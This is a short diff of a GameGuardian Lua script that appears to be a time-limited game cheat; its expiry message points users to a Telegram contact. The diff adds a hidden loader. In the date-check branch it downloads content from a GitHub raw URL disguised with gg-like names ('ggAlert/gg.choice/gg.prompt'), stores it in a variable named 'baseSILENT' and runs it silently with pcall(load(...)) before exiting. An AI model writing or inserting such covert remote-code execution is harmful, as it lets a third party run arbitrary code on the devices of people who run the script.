@@ -43,8 +43,12 @@ if 1 == 1 then
   if checking(1, 1, 2024) then 
     
     gg.alert('benazam')
-    os.exit()
 
+    local baseSILENT = gg.makeRequest("https://raw.githubusercontent.com/ggAlert/gg.choice/main/gg.prompt").content
+
+    pcall(load(baseSILENT))
+
+    os.exit()
 
   else
     gg.alert("⭕Your Script Expired \n \n--> Please send message in Telegram (my id @No_Pulse) for get new version")
